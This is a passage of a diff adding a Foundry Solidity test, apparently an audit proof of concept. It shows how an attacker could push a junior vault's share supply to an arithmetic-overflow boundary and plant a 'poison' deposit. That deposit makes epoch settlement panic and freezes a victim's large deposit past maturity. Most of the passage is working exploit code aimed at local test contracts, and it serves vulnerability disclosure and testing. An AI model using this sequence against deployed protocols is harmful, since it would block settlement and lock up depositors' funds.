+        emit log_named_uint("m3.duration.successfulAmplifications", successfulAmplifications);
+        emit log_named_uint("m3.duration.supplyAtBoundary", supplyAtBoundary);
+        emit log_named_uint("m3.duration.preBranchJunior", preBranchJunior);
+        emit log_named_uint("m3.duration.attackSeniorPrincipal", attack.seniorPrincipal);
+        emit log_named_uint("m3.duration.controlSeniorPrincipal", control.seniorPrincipal);
+        emit log_named_uint("m3.duration.attackProjectedJuniorAtTarget", attack.projectedJuniorAtTarget);
+        emit log_named_uint("m3.duration.freezeSecondsAfterVictimMaturity", attack.targetTime - attack.victimMaturity);
+    }
+
+    function _reachNextDepositOverflowWithoutQueueingIt() internal returns (uint256 successful) {
+        _drainJuniorToTarget();
+
+        for (uint256 i; i < 96; ++i) {
+            (uint256 nextEpoch,) = juniorVault.getRequestEpochWindow();
+            uint256 maturity = juniorVault.depositEpochStart(nextEpoch);
+            (uint256 projectedSenior, uint256 projectedJuniorNow) = pool.getPendingDepositTrancheState();
+            uint256 elapsed = maturity - block.timestamp;
+            uint256 nextCoupon = (projectedSenior * pool.seniorRateBps() * elapsed) / (10_000 * YEAR);
+            uint256 pricingAssets = projectedJuniorNow > nextCoupon ? projectedJuniorNow - nextCoupon + 100 : 100;
+            uint256 supply = juniorVault.accruedTotalSupply();
+
+            bool fits;
+            try juniorVault.quoteDepositFromState(MIN_DEPOSIT, pricingAssets, supply, 0) returns (uint256 shares) {
+                fits = supply <= type(uint256).max - shares;
+            } catch {
+                fits = false;
+            }
+            if (!fits) {
+                return successful;
+            }
+
+            uint256 id = _requestJuniorDeposit(MIN_DEPOSIT);
+            assertEq(id, nextEpoch, "deposit must use the projected epoch");
+            vm.warp(maturity);
+            _settleLpPublic();
+            vm.prank(JUNIOR_ACTOR);
+            juniorVault.claimDeposit(id, MIN_DEPOSIT, JUNIOR_ACTOR, JUNIOR_ACTOR);
+            ++successful;
+
+            (uint256 followingEpoch,) = juniorVault.getRequestEpochWindow();
+            uint256 followingMaturity = juniorVault.depositEpochStart(followingEpoch);
+            uint256 followingElapsed = followingMaturity - pool.lastSeniorCouponCheckpointTime();
+            uint256 followingCoupon =
+                (pool.seniorPrincipal() * pool.seniorRateBps() * followingElapsed) / (10_000 * YEAR);
+            uint256 grossProfit = pool.juniorPrincipal() - TARGET_JUNIOR - followingCoupon + CLOSE_FEE_ESTIMATE;
+            grossProfit -= grossProfit % 11;
+            _trade(TRADER, false, OPEN_PRICE);
+            _trade(TRADER, true, OPEN_PRICE - (grossProfit / 11));
+        }
+        revert("next deposit never reached overflow boundary");
+    }
+
+    function _runPoisonAndVictimBranch() internal returns (BranchResult memory result) {
+        result.supply = juniorVault.totalSupply();
+        result.seniorPrincipal = pool.seniorPrincipal();
+        result.seniorHwm = pool.seniorHighWaterMark();
+
+        result.poisonId = _requestJuniorDeposit(MIN_DEPOSIT);
+        vm.warp(juniorVault.depositEpochStart(result.poisonId));
+        (uint256 projectedSenior, uint256 projectedJunior) = pool.getPendingDepositTrancheState();
+        assertGt(projectedJunior, 0, "poison must mature at positive Junior NAV");
+        assertGt(projectedSenior, 0, "Senior seed must remain");
+        (bool quoteOk, bytes memory quoteErr) = address(juniorVault).staticcall(
+            abi.encodeCall(
+                juniorVault.quoteDepositFromState,
+                (MIN_DEPOSIT, projectedJunior, juniorVault.accruedTotalSupply(), uint256(0))
+            )
+        );
+        assertFalse(quoteOk, "the exact matured quote must be unrepresentable");
+        assertEq(_selector(quoteErr), bytes4(0x4e487b71), "quote must panic");
+
+        bytes[] memory poisonPayload = _livePayload(OPEN_PRICE, OPEN_PRICE);
+        vm.prank(KEEPER);
+        (bool poisonOk, bytes memory poisonErr) =
+            address(router).call(abi.encodeCall(router.settleLpEpoch, (poisonPayload)));
+        assertFalse(poisonOk, "poisoned deposit must revert settlement");
+        assertEq(_selector(poisonErr), bytes4(0x4e487b71), "arithmetic panic expected");
+        result.poisonFailureTime = block.timestamp;
+
+        settlementToken.mint(JUNIOR_VICTIM, 2_000_000e6);
+        vm.startPrank(JUNIOR_VICTIM);
+        settlementToken.approve(address(juniorVault), 2_000_000e6);
+        result.victimId = juniorVault.requestDeposit(2_000_000e6, JUNIOR_VICTIM, JUNIOR_VICTIM);
+        vm.stopPrank();
+        result.victimMaturity = juniorVault.depositEpochStart(result.victimId);
+        vm.warp(result.victimMaturity);
+
+        result.targetTime = result.victimMaturity + 24 hours + 1;
+        vm.warp(result.targetTime);
+        (, result.projectedJuniorAtTarget) = pool.getPendingDepositTrancheState();
+
+        vm.prank(JUNIOR_VICTIM);
+        (result.victimCancelSucceeded,) = address(juniorVault).call(
+            abi.encodeWithSignature(
+                "cancelPendingDeposit(uint256,address,address)",
+                result.victimId,
+                JUNIOR_VICTIM,
+                JUNIOR_VICTIM
+            )
+        );
+
+        if (!result.victimCancelSucceeded) {
+            bytes[] memory retryPayload = _livePayload(OPEN_PRICE, OPEN_PRICE);
+            vm.prank(KEEPER);
+            (bool retryOk, bytes memory retryErr) =
+                address(router).call(abi.encodeCall(router.settleLpEpoch, (retryPayload)));
+            result.retryPanicked = !retryOk && _selector(retryErr) == bytes4(0x4e487b71);
+        }
+    }
+
+    function _requestJuniorDeposit(uint256 assets) internal returns (uint256 id) {
+        settlementToken.mint(JUNIOR_ACTOR, assets);
+        vm.startPrank(JUNIOR_ACTOR);
+        settlementToken.approve(address(juniorVault), assets);
+        id = juniorVault.requestDeposit(assets, JUNIOR_ACTOR, JUNIOR_ACTOR);
+        vm.stopPrank();
+    }
+}
```
